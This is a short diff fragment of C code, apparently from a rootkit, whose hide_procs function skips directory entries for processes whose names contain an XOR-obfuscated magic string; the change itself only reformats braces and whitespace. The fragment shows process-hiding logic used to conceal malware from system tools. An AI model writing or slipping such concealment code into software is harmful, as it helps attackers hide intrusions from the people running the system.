@@ -5,7 +5,7 @@
 
 
 struct dirent *hide_procs(DIR *dirp)
-{ 
+{
 	struct dirent *dir;
 	char *magic = strdup(MAGIC); xor(magic);
 	while(1)
@@ -15,7 +15,9 @@ struct dirent *hide_procs(DIR *dirp)
 		{ 
 			char proc_name[256]; 
 			if (name_from_pid(dir->d_name, proc_name) && (strstr(proc_name, magic)  != NULL))
-				continue; 
+			{
+				continue;
+			}
 		}
 		break;
 	}
